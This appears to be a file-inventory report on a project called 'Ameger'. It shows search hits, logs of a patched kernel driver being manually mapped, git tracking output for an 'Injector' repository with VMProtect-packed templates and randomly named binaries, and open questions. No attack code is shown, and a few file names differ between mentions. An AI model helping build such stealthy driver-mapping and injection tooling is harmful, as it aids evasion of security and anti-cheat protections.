Pattern: `Ameger|Injector|Memory_Inject|MEMORY_INJECTIONDATA|AMEGER_RUNTIME_ABI_VERSION`
Search path: `D:\Ameger\Mapper`

Exact matches:

```text
D:\Ameger\Mapper\.clangd:37:     - "-ID:/Ameger/Hypervisor/Client/Library"

D:\Ameger\Mapper\Mapper\App\Main.cpp:737: 		Log(L"[+] Injector PID for the AMGParamBlock patch (injector-side, see AmgClientPatchImage): "

D:\Ameger\Mapper\Build\Release\mapper_debug.log:4:   [+] Injector PID for the AMGParamBlock patch (injector-side, see AmgClientPatchImage): 16320
D:\Ameger\Mapper\Build\Release\mapper_debug.log:6:   [+] File:         [92mAmegerStub.patched.sys[0m
D:\Ameger\Mapper\Build\Release\mapper_debug.log:7:   [+] Path:         [92mD:\Ameger\Injector\Driver\Build\Output\AmegerStub.patched.sys[0m
D:\Ameger\Mapper\Build\Release\mapper_debug.log:37:   [+] Loaded [92m20[0m Offsets ([92m8[0m Symbols, [92m12[0m Fields) From [92mD:\Ameger\Mapper\Build\Release\Offsets.ini[0m
D:\Ameger\Mapper\Build\Release\mapper_debug.log:59:   [-] "[92mAmegerStub.patched.sys[0m" was mapped, but DriverEntry returned [92m0xc0000001[0m ([92mSTATUS_UNSUCCESSFUL[0m).
```

Analysis: The Mapper tree does reference Injector-related names, but the only functional source hit is the log string in `Mapper/App/Main.cpp`. The log file under `Build/Release` records that the Mapper expected an Injector-side patched driver file path at `D:\Ameger\Injector\Driver\Build\Output\AmegerStub.patched.sys` and observed `DriverEntry` failing with `STATUS_UNSUCCESSFUL`.

### 3. Are the shipped binaries tracked in git?

`git -C D:\Ameger\Injector ls-files -- Build/Release Assets` output:

```text
Assets/DLL/Jlov.dll
Assets/Template/Host - x64.exe.vmp
Assets/Template/Jlov.dll.vmp
```

`git -C D:\Ameger\Injector check-ignore -v Build/Release/MQI0nnNXNF.exe Build/Release/eL9GtxYt.ini "Build/Release/dhvkntBeAWck/UEuHqbGD0xn.dll"` output:

```text
.gitignore:1:Build/Release/	Build/Release/MQI0nnNXNF.exe
.gitignore:1:Build/Release/	Build/Release/eL9GtxyT.ini
.gitignore:1:Build/Release/	Build/Release/dhvkntBeAWck/UEuHqbGD0xn.dll
```

`.gitignore`:

```gitignore
Build/Release/
Build/obj/
Driver/Build/Release/
Driver/Build/obj/

.symbols/

nul
NUL

.zed/settings.json.local

*.proxy.log

.orchestrator
```

## BUILD-HYGIENE

Tracked paths under `Assets`:

| Path | Tracked |
|---|---|
| `Assets/DLL/Jlov.dll` | yes |
| `Assets/Template/Host - x64.exe.vmp` | yes |
| `Assets/Template/Jlov.dll.vmp` | yes |

Ignored paths under `Build/Release`:

| Path | Ignored by |
|---|---|
| `Build/Release/MQI0nnNXNF.exe` | `.gitignore:1` |
| `Build/Release/eL9GtxyT.ini` | `.gitignore:1` |
| `Build/Release/dhvkntBeAWck/UEuHqbGD0xn.dll` | `.gitignore:1` |

Untracked and not ignored: none.

## OPEN-QUESTIONS

- The kernel driver `\\.\PdFwKrnl` is not in this repo; its IOCTL handler is unknown from the source tree.
- `D:\Ameger\Mapper\Mapper\Provider\Service.cpp` could not be opened: File not found.
- It is not yet determined whether the Mapper references to `D:\Ameger\Injector\Driver\Build\Output\AmgerStub.patched.sys` indicate an active integration path or only a logged attempt.
- It is not yet determined whether the shipped binaries under `Build/Release` are intentionally excluded from git while `Assets` payload/template files are tracked.





